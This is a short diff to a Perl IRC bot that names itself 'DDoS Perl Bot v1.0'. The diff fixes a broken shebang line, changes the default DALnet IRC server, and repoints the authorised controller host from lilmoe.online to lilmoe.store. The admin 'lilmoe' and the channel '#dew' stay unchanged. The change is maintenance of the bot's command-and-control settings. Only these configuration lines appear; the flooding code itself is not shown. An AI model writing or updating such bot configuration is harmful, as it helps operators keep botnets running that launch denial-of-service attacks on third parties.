@@ -1,4 +1,4 @@
-!u #!/usr/bin/perl
+#!/usr/bin/perl
  
 ######################################################################################################################
 ######################################################################################################################
@@ -133,7 +133,7 @@ chop (my $realname = $rircname[rand scalar @rircname]);
 my $nick =$rircname[rand scalar @rircname];
 
 
-$server = 'us.dal.net' unless $server;
+$server = 'irc.dal.net' unless $server;
 my $port = '6667';
  
 my $linas_max='8';
@@ -143,7 +143,7 @@ my $homedir = "/tmp";
 my $version = 'DDoS Perl Bot v1.0';
  
 my @admins = ("lilmoe");
-my @hostauth = ("lilmoe.online");
+my @hostauth = ("lilmoe.store");
 my @channels = ("#dew");
  
 my $pacotes = 1;
@@ -935,3 +935,4 @@ sub back { away(); }
 ###################
 ##### [ EOF ] #####
 ###################
+
